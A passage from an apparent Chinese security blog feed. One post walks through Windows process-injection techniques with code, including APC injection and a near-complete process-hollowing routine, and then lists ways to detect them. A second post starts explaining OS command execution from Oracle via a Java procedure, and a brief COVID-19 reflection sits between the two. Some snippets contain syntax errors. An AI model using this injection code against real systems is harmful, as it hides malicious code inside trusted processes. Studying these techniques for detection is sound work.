<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Inject our DLL into the process&#x27;s address space.</span><br><span class="hljs-comment">*/</span><br>HANDLE threadID = <span class="hljs-built_in">CreateRemoteThread</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (threadID == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the remote thread could not be created.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">CloseHandle</span>(process);<br></code></pre></td></tr></table></figure><p>   前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的<br>但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中<br>的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。</p><p>  很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据<br>经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后<br>进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！<br>所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。</p><h4 id="写远程进程内存"><a href="#写远程进程内存" class="headerlink" title="写远程进程内存"></a>写远程进程内存</h4><p>   第二种方法是直接远程注入代码,不注入DLL,其实并不一定要调用CreateRemoteThread<br>还有好几种替代方法,</p><ol><li>CreateRemoteThread最终会调用NtCreateThreadEx Native API，可以直接调用这个<br>  Native API来启动远程的线程。</li><li>RtlCreateUserThread</li></ol><h3 id="1-4-AppInit-DLLs"><a href="#1-4-AppInit-DLLs" class="headerlink" title="1.4 AppInit_DLLs"></a>1.4 AppInit_DLLs</h3><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></p><p>   这个键值被《Windows核心编程》介绍而格外出名，可执行文件在处理User32.dll的<br>DLL_PROCESS_ATTACH 时，会使用LoadLibirary加载AppInit_DLLS, 不链接User32.dll的程<br>序将不会加载AppInit_DLLS, 很少程序不需要链接User32.dll</p><p>新版本的Windows增加了几个关键的键值，会对DLL的注入有影响。</p><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs</code></p><ul><li>REG_DWORD 1 表示全局开启</li><li>REG_DWORD 0 表示全局关闭</li></ul><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\RequireSignedAppInit_DLLs</code></p><ul><li>REG_DWORD 0 加载任意DLL</li><li>REG_DWORD 1 只加载签名的DLL</li></ul><h3 id="1-5-QueueUserApc"><a href="#1-5-QueueUserApc" class="headerlink" title="1.5 QueueUserApc"></a>1.5 QueueUserApc</h3><p>QueueUserApc API 原型如下：</p><p>DWORD WINAPI QueueUserAPC(<br>  <em>In</em>  PAPCFUNC pfnAPC,    &#x2F;&#x2F; APC function<br>  <em>In</em>  HANDLE hThread,     &#x2F;&#x2F; handle of thread<br>  <em>In</em>  ULONG_PTR dwData    &#x2F;&#x2F; APc function parameter<br>);</p><p>这个注入方法用的不多，但是也是老方法了，pjf在2007年《暴力注入explorer》的文章里<br>就提到了这种方法。作用是在线程的Apc队列插入一个用户模式下的APC 对象。</p><p>APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC<br>队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上<br>执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列<br>里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者<br>MsgWaitForMultipleObjectsEx时线程进入alertable状态。</p><p>所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入<br>APC 对象，基本上总有一个线程是alertable状态。</p><p>核心伪代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD ret;<br><span class="hljs-type">char</span> *DllName = <span class="hljs-string">&#x27;c:\\MyDll.dll&#x27;</span>;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(DllName) + <span class="hljs-number">1</span>;<br><br>HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br>PVOID param = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);<br><br><span class="hljs-keyword">if</span> (param != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;<br>  <span class="hljs-keyword">for</span> (DWORD p = <span class="hljs-number">0</span>; p &lt; NumberOfThreads; p ++) &#123;<br>    hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="hljs-number">0</span>, ThreadId[p]);<br>    <span class="hljs-keyword">if</span> (hThread != <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);<br>      <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InjectDll</span><span class="hljs-params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;<br>  <span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&#x27;kernel32.dll&#x27;</span>, <span class="hljs-string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)param）;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。<br>这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。</p><p>基本步骤如下：</p><ol><li>使用CREATE_SUSPENDED调用CreateProcessW创建进程</li><li>使用ZwUnmapViewOfSection卸载进程空间中的原始代码</li><li>使用VirtualAllocEx分配内存，确保分配区域可写可执行</li><li>使用WriteProcessMemory在分配区域内写入恶意代码</li><li>使用SetThreadContext设置线程内容为指定的恶意代码</li><li>使用ResumeThread回复进程执行</li></ol><p>代码中用到PEB的结构：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;dt nt<span class="hljs-title">!_PEB</span><br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">000</span> InheritedAddressSpace : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">001</span> ReadImageFileExecOptions : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">002</span> BeingDebugged : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">003</span> SpareBool : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">004</span> Mutant : Ptr<span class="hljs-number">32</span> Void<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">008</span> ImageBaseAddress : Ptr<span class="hljs-number">32</span> Void<br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">InjectProcess</span><span class="hljs-params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span><br><span class="hljs-function"></span>&#123;<br> HANDLE hFile;<br> DWORD dwFileSize;    <span class="hljs-comment">//文件大小</span><br> IMAGE_DOS_HEADER DosHeader;<br> IMAGE_NT_HEADERS NtHeader;<br> PROCESS_INFORMATION pi;<br> STARTUPINFO si;<br> CONTEXT context;<br> PVOID ImageBase;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ImageSize;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> BaseAddr;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> retByte = <span class="hljs-number">0</span>;<br> LONG offset;<br> HMODULE hNtDll=<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br> <span class="hljs-keyword">if</span>(!hNtDll)<br>  <span class="hljs-keyword">return</span> FALSE;<br> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="hljs-built_in">GetProcAddress</span>(hNtDll,<span class="hljs-string">&quot;ZwUnmapViewOfSection&quot;</span>);<br> <span class="hljs-built_in">memset</span>(&amp;si, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(si));<br> <span class="hljs-built_in">memset</span>(&amp;pi, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(pi));<br> si.cb = <span class="hljs-built_in">sizeof</span>(si);<br><br> hFile = ::<span class="hljs-built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="hljs-literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE)<br> &#123;<br>  <span class="hljs-keyword">return</span> FALSE;<br> &#125;<br> ::<span class="hljs-built_in">SetFilePointer</span>(hFile, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br> dwFileSize = ::<span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br> LPBYTE pBuf = <span class="hljs-keyword">new</span> BYTE[dwFileSize];<br> <span class="hljs-built_in">memset</span>(pBuf, <span class="hljs-number">0</span>, dwFileSize);<br> DWORD dwNumberOfBytesRead = <span class="hljs-number">0</span>;<br>    ::<span class="hljs-built_in">ReadFile</span>( hFile<br>        , pBuf<br>        , dwFileSize<br>        , &amp;dwNumberOfBytesRead<br>        , <span class="hljs-literal">NULL</span><br>        );<br><br> ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;DosHeader,pBuf,<span class="hljs-built_in">sizeof</span>(IMAGE_DOS_HEADER));<br> ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));<br> <span class="hljs-comment">//检查PE结构</span><br> <span class="hljs-comment">//以挂起方式进程</span><br> BOOL res = <span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>,VictimFile,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;si,&amp;pi); <br><br> <span class="hljs-keyword">if</span> (res)<br> &#123;<br>  context.ContextFlags = CONTEXT_FULL;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="hljs-comment">//如果调用失败</span><br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  <span class="hljs-built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>),&amp;BaseAddr,<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>),<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">if</span> (!BaseAddr)<br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  <span class="hljs-comment">//拆卸傀儡进程内存模块</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ZwUnmapViewOfSection</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)pi.hProcess,BaseAddr))<br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  ImageBase = <span class="hljs-built_in">VirtualAllocEx</span>(pi.hProcess, <br>   (<span class="hljs-type">void</span> *)NtHeader.OptionalHeader.ImageBase,<br>   NtHeader.OptionalHeader.SizeOfImage, <br>   MEM_RESERVE|MEM_COMMIT, <br>   PAGE_EXECUTE_READWRITE);  <span class="hljs-comment">//ImageBase 0x00400000</span><br>  <span class="hljs-keyword">if</span> (ImageBase == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>   DWORD wrongFlag = <span class="hljs-built_in">GetLastError</span>();<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;  <br>  <span class="hljs-comment">//替换傀儡进程内存数据</span><br>  <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))<br>  &#123;<br>   DWORD wrongFlag2 = <span class="hljs-built_in">GetLastError</span>();  <br>  &#125;<br>  <span class="hljs-comment">//DOS 头 + PE 头 + 区块表的总大小</span><br>  <span class="hljs-comment">//定位到区块头</span><br>  offset = DosHeader.e_lfanew + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS);<br>  IMAGE_SECTION_HEADER secHeader;<br>  WORD i = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)<br>  &#123;<br>   <span class="hljs-comment">//定位到各个区块</span><br>   ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER));<br>   <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);<br>   <span class="hljs-built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);<br>  &#125;<br> <br>  context.ContextFlags = CONTEXT_FULL;<br>  <span class="hljs-comment">//重置 执行文件入口</span><br>  <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>), <br>   &amp;ImageBase,   <span class="hljs-comment">//4194304</span><br>   <span class="hljs-number">4</span>, &amp;retByte);<br>  context.Eax = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;<br>  <span class="hljs-built_in">SetThreadContext</span>(pi.hThread,&amp;context);<br>  <span class="hljs-built_in">ResumeThread</span>(pi.hThread);<br> &#125;<br> <br> <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br> <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br> ::<span class="hljs-built_in">CloseHandle</span>(hFile);  <br> <span class="hljs-keyword">delete</span>[] pBuf;<br> <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h2><ol><li>注册表相关注入继续可以通过Hook写注册表相关API实现监控</li><li>SetWindowsHookEx则需要检查最后一个参数是否为0，为0表示全局注入，这是我们<br>  关注的地方。但是输入法之类的正常程序也可能使用注入技术。</li><li>CreateRemoteThread进程注入比较复杂，核心要点是要有跨进程写入数据的动作，<br>  后续从两个维度来进行检查</li></ol><h3 id="2-1-检查跨进程写入的数据"><a href="#2-1-检查跨进程写入的数据" class="headerlink" title="2.1 检查跨进程写入的数据"></a>2.1 检查跨进程写入的数据</h3><p>虽然WriteProcessMemory的底层API经常被Windows底层用作数据传递，但是通过<br>特征可以识别出来</p><ol><li>写入的数据是PE文件</li><li>写入的数据里包含.dll (一般是DLL文件名，或者是导入表相关数据)</li><li>写入超长数据</li></ol><h3 id="2-2-检查线程代码执行部分地址"><a href="#2-2-检查线程代码执行部分地址" class="headerlink" title="2.2 检查线程代码执行部分地址"></a>2.2 检查线程代码执行部分地址</h3><p>检查代码地址是否在WriteProcessMemory写入的数据区域之内</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html">Windows DLL Injection Basics</a></li><li><a href="http://blog.csdn.net/evi10r/article/details/6745138">使用异步过程调用（APC）实现模块注入</a></li><li><a href="http://bbs.pediy.com/showthread.php?t=99206">Ring3下WX方法结束微点2009</a></li><li><a href="http://blog.w4kfu.com/tag/duqu">New method of injection</a></li><li><a href="http://www.i7s3curi7y.com/win32-code-injection-techniques">The Ultimate Win32 code injection Reference</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些杂谈</title>
    <link href="/cn/other/"/>
    <url>/cn/other/</url>
    
    <content type="html"><![CDATA[<p>整个春节被武汉的新型冠状病毒肺炎搞得人心惶惶，2020 注定是我们这辈人难忘的一年，非典的时候比较小感觉没那么恐怖，现在的感觉就完全不一样了，整天都在洗手中度过。</p><p>在病情扩散期间，大量消息满天飞，给政府提意见的更是比比皆是，但是大家都忽视了 一点，就是要相信专业。很多人不太明白专业和非专业之间的差距，可以想象一下你和一 个围棋九段的人下围棋，怎么换到医学领域大家就都是专家了？</p><p>我看到一个建议轻征不隔离，把资源让给重症者。</p><p>大家觉得这个建议如何？提这个建议的人说，主要依据是死亡人不多。这个犯了几个错误， 第一，要看死亡率，而不是死亡人数，患病的人多了，自然死人的就多了。第二，根据我 有限的常识，病毒是会自适应性的进化的，感染的人多了，可能就会产生更nb 的变种了。</p><p>这个事情主要还是相信国家，相信我们的祖国。我觉得这个事情一定会解决了，只是时间 和损失程度问题，一季度的gdp 肯定是受影响了，希望疫情快点过去，天佑中华！</p><p>最后希望所有看到此文的，新年幸福安康！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Execute os command in Oracle Database</title>
    <link href="/cn/oracle_run_os_cmd/"/>
    <url>/cn/oracle_run_os_cmd/</url>
    
    <content type="html"><![CDATA[<h2 id="1-正统方法"><a href="#1-正统方法" class="headerlink" title="1. 正统方法"></a>1. 正统方法</h2><h3 id="1-1-使用JAVA"><a href="#1-1-使用JAVA" class="headerlink" title="1.1 使用JAVA"></a>1.1 使用JAVA</h3><h4 id="1-1-1-代码"><a href="#1-1-1-代码" class="headerlink" title="1.1.1 代码"></a>1.1.1 代码</h4><p>Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="hljs-string">&quot;JAVACMD&quot;</span> AS<br><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JAVACMD</span><br>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execCommand</span> <span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException<br> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        String[] finalCommand;<br>        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">4</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/y&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>            finalCommand[<span class="hljs-number">3</span>] = command;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = command;<br>        &#125;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(finalCommand);<br>        <span class="hljs-keyword">if</span> (p.waitFor() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (p.exitValue() == <span class="hljs-number">1</span>)<br>               System.err.println(<span class="hljs-string">&quot;command execute failed.&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>        String lineStr;<br>        <span class="hljs-keyword">while</span> ((lineStr = inBr.readLine()) != <span class="hljs-literal">null</span>)<br>            System.out.println(lineStr);<br>        inBr.close();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125; <br> &#125;<br>&#125;;<br>/<br><br>CREATE OR REPLACE PROCEDURE <span class="hljs-title function_">JAVACMDPROC</span> <span class="hljs-params">(p_command IN VARCHAR2)</span><br>AS LANGUAGE JAVA<br>NAME <span class="hljs-string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;<br>/<br></code></pre></td></tr></table></figure><h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> serveroutput <span class="hljs-keyword">on</span> size <span class="hljs-number">100000</span>;<br><span class="hljs-keyword">exec</span> dbms_java.set_output(<span class="hljs-number">100000</span>);<br></code></pre></td></tr></table></figure><h4 id="1-1-3-需要的权限"><a href="#1-1-3-需要的权限" class="headerlink" title="1.1.3 需要的权限"></a>1.1.3 需要的权限</h4><p>可以使用下面的语句查询相关权限</p><ul><li>用户权限</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> session_privs;<br></code></pre></td></tr></table></figure><ul><li>JAVA 权限</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dba_java_policy;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user_java_policy;<br></code></pre></td></tr></table></figure><p>使用java代码执行系统命令需要的权限，可以使用下面语句进行授权：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> 